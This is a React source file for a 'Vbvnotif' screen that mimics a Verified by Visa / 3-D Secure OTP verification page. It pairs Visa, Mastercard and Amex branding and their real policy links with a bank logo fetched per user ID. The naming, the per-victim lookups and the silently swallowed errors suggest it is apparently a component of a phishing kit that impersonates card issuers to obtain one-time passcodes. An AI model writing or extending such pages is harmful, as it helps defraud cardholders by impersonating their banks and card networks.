import React, { useState, useEffect } from 'react';
import { useHistory } from 'react-router-dom';
import axios from 'axios';
import { zokomId } from '../utils/auth';
import visaLogo from './visalogo.svg';
import mcLogo from './mc.svg';
import amexLogo from './amexlogo.svg';

const Vbvnotif = ({ onContinue }) => {
  const [styles, setStyles] = useState(null);
  const [userInfo, setUserInfo] = useState({ mobileNumber: '', email: '' });
  const [selectedOption, setSelectedOption] = useState('a');
  const [logoUrl, setLogoUrl] = useState('');
  const [brand, setBrand] = useState('');
  const history = useHistory();
  const userId = zokomId();
  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/three.css'),
          import('../../assets/styles/three.css')
        ]);
        
        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default
        });
      } catch (error) {
      }
    };
    
    const fetchLogoUrl = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/authenticate/logo-url/${userId}`);
        if (response.data) {
          setLogoUrl(response.data.logoUrl);
          setBrand(response.data.brand);
        }
      } catch (error) {
      }
    };
    
    loadStyles();
    fetchLogoUrl();
  }, [userId]);
  
  const privacyLinks = {
    'mastercard': 'https://mea.mastercard.com/en-region-mea/vision/privacy.html',
    'visa': 'https://usa.visa.com/legal/privacy-policy.html',
    'amex': 'https://www.americanexpress.com/privacy-center/'
  };
  
  const termsLinks = {
    'mastercard': 'https://www.mastercard.us/en-us/vision/who-we-are/terms-of-use.html',
    'visa': 'https://usa.visa.com/support/consumer/visa-rules.html',
    'amex': 'https://www.americanexpress.com/in/legal/most-important-terms-conditions-agreements.html'
  };
  
  const handleOptionChange = (e) => {
    setSelectedOption(e.target.value);
  };
  
  
  const getLink = (type) => {
    const links = type === 'privacy' ? privacyLinks : termsLinks;
    return links[brand.toLowerCase()] || '#';
  };
  const getBrandLogo = () => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
        case 'mastercard':
          return mcLogo;
          case 'amex':
            case 'american express':
              return amexLogo;
              default:
                return '';
              }
            };
  
  const handleContinue = async (e) => {
    e.preventDefault(); // Prevent default form submission
    
    const links = {
      privacy: getLink('privacy'),
      terms: getLink('terms')
    };

    if (onContinue) {
      onContinue(logoUrl, getBrandLogo(), links);
    }

    try {
      const response = await axios.post(
        `${process.env.REACT_APP_API_URL}/api/authenticate/continue/${userId}`
      );
    } catch (error) {
    }
  };
            
            return (
              <div className="threeds-two">
      <div className="container-fluid">
        <div className="header" id="HeaderLogos">
          <div className="row no-pad">
            <div className="col-12">
              <img alt="" style={{marginTop: "4px"}} src={logoUrl} className="img-responsive header-logo pull-left" />
              <img alt="" className="img-responsive header-logo pull-right" src={getBrandLogo()} />
            </div>
          </div>
        </div>
        <br />
        <div className="body" dir="LTR" style={{ bottom: '111.952px' }}>
          <div className="container container-sticky-footer">
            <form
              autoComplete="off"
              id="ChooseCredentialForm"
              method="post"
              name="ChooseCredentialForm"
              noValidate="novalidate"
              onSubmit={handleContinue}
            >
              <div className="body" dir="LTR" style={{ bottom: '111.952px' }}>
                <h1 className="screenreader-only">Verification needed</h1>
                <br />
                <div className="row"></div>
                <br />
                <div className="row pad-half">
                  <div className="col-12">
                    <div id="Body1">
                      For your protection, we are requesting confirmation of your identity by sending a One Time Passcode (OTP) to your registered mobile number or email.
                    </div>
                  </div>
                </div>
                <br />
                
                
              </div>
              <div className="sticky-footer">
                <div className="row no-pad">
                  <div className="col-12" id="ChoiceOptInMessage" dir="LTR">
                    By clicking ‘Continue’, you agree to receive the OTP at the designated email address or mobile number. <b>Message &amp; Data rates may apply.</b>
                  </div>
                  <div className="col-12 text-center" style={{ paddingTop: '20px',paddingBottom: '20px' }}>
                    <button type="submit" className="btn btn-primary" id="ContinueButton">Continue</button>
                <div className="" id="FooterLinks" style={{ marginTop: '0px' }}>
                  <div className="row">
                    <div className="col-12">
                      <ul className="list-group list-group-horizontal flex-wrap">
                        <li className="list-group-item border-0">
                          <a className="btn btn-link" data-bs-target="#Privacy" data-bs-toggle="modal" href={getLink('privacy')} id="FooterLink2">Privacy Policy</a>
                        </li>
                        <li className="list-group-item border-0">
                          <a className="btn btn-link" data-bs-target="#Terms" data-bs-toggle="modal" href={getLink('terms')} id="FooterLink2">Terms and Conditions</a>
                        </li>
                      </ul>
                      <a id="ExitLink" className="list-group list-group-horizontal flex-wrap pull-right" href="#">Exit</a>
                    </div>
                  </div>
                </div>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </div>
        <br />
      </div>
    </div>

  );
};

export default Vbvnotif;